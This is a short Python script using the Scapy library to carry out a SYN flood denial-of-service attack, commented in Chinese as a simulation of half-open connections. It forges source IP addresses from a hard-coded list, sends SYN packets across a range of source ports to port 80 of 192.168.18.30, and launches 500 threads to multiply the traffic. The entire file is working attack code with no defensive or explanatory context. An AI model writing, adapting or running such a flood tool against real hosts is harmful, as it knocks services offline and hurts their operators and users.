import random, threading
from scapy.all import *
from scapy.layers.inet import IP, TCP

# 模拟半连接，syn泛洪攻击
def synflood(tgt, dport):
    srclist = ['192.168.2.1', '192.168.23.12', '192.168.123.1']
    for sport in range(10000, 20000):
        index = random.randint(0, 2)
        ipLayer = IP(src=srclist[index], dst=tgt)
        TcpLayer = TCP(sport=sport, dport=dport, flags='S')
        packet1 = ipLayer / TcpLayer
        print(packet1)
        send(packet1)


if __name__ == '__main__':
    for i in range(500):
        threading.Thread(target=synflood, args=('192.168.18.30', 80)).start()
